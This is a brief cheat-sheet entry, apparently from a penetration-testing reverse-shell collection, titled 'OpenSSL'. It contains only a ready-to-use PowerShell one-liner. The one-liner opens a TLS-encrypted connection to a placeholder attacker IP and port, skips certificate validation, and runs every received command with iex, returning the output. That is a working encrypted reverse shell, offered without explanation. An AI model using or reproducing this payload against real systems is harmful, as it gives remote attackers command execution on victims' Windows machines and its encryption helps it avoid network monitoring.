# OpenSSL

## 01 - Powershell

```powershell
PS C:\> $socket=New-Object Net.Sockets.TcpClient('<IP>', <PORT>);$stream=$socket.GetStream();$sslStream=New-Object System.Net.Security.SslStream($stream,$false,({$True}-as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient('fake.domain',$null,"Tls12",$false);$writer=new-object System.IO.StreamWriter($sslStream);$writer.Write('PS '+(pwd).Path+'> ');$writer.flush();[byte[]]$bytes=0..65535|%{0};while(($i=$sslStream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data|Out-String)2>&1;$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
```